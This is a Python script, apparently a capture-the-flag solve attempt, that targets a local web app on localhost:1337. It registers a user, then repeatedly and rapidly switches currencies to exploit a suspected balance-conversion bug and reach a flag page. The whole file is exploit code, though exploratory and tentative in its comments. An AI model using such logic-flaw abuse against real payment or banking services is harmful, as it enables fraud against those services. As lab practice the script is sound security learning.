import requests
import time

# Target URL
BASE_URL = "http://localhost:1337"

def register_user(username, password):
    """Register a new user"""
    session = requests.Session()
    
    data = {
        "username": username,
        "password": password,
        "confirm_password": password
    }
    
    response = session.post(f"{BASE_URL}/register", data=data)
    print(f"Register response: {response.status_code}")
    return session

def login_user(session, username, password):
    """Login user"""
    data = {
        "username": username,
        "password": password
    }
    
    response = session.post(f"{BASE_URL}/login", data=data)
    print(f"Login response: {response.status_code}")
    return session

def change_currency(session, currency):
    """Change currency"""
    data = {
        "currency": currency
    }
    
    response = session.post(f"{BASE_URL}/change-currency", data=data)
    print(f"Change currency to {currency}: {response.status_code}")
    return session

def check_balance(session):
    """Check current balance"""
    response = session.get(f"{BASE_URL}/")
    print(f"Balance page: {response.status_code}")
    if response.status_code == 200:
        print(f"Balance content: {response.text[:500]}...")
    return response.text

def check_rich(session):
    """Check if we're rich enough for flag"""
    response = session.get(f"{BASE_URL}/are-you-rich")
    print(f"Are you rich page: {response.status_code}")
    if response.status_code == 200:
        print(f"Rich check content: {response.text}")
    return response.text

def exploit_bug():
    """Exploit the bug in change_currency function"""
    username = f"bug_user_{int(time.time())}"
    password = "password123"
    
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # Check initial balance
    print("\n=== Initial Balance ===")
    check_balance(session)
    
    # The bug: Try to change currency when user_balances[u] doesn't exist
    # This should trigger the bug: user_balances[u] = STONKS_GIFT * user_currencies[u]
    # where user_currencies[u] might not exist or be None
    
    print("\n=== Exploiting the bug ===")
    
    # Strategy 1: Try to trigger the bug by changing currency multiple times
    currencies = ["JPY", "KRW", "IDR", "EUR", "USD", "AUD"]
    
    for i, currency in enumerate(currencies):
        print(f"\n--- Step {i+1}: Change to {currency} ---")
        session = change_currency(session, currency)
        check_balance(session)
        check_rich(session)
        time.sleep(0.1)
    
    # Strategy 2: Try specific currency combinations that might cause overflow
    print("\n=== Strategy 2: Specific combinations ===")
    
    # Try GBP (small rate) -> KRW (large rate) -> AUD
    session = change_currency(session, "GBP")
    session = change_currency(session, "KRW") 
    session = change_currency(session, "AUD")
    check_balance(session)
    check_rich(session)
    
    # Try multiple rapid changes
    print("\n=== Strategy 3: Rapid changes ===")
    for _ in range(10):
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        check_rich(session)
        time.sleep(0.05)

if __name__ == "__main__":
    exploit_bug() 